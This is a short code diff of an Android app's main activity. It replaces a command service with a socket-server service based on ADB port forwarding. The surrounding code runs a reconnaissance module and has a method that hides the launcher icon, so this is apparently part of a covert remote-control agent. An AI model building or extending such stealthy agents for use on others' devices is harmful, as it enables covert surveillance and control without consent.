@@ -20,7 +20,7 @@ import androidx.core.content.ContextCompat;
 import android.provider.Settings;
 
 import com.mobilemorph.agent.ReconModule;
-import com.mobilemorph.agent.services.CommandService;
+import com.mobilemorph.agent.services.ServerSocketService;
 import com.mobilemorph.agent.UpdateChecker;
 
 public class MainActivity extends Activity {
@@ -108,12 +108,8 @@ public class MainActivity extends Activity {
         ReconModule.runRecon(this);
         UpdateChecker.checkForUpdate(this);
 
-        Intent serviceIntent = new Intent(this, CommandService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
+        // Start the new ServerSocketService (ADB port forwarding based)
+        ServerSocketService.startServer(this);
     }
 
     private void hideLauncherIcon() {
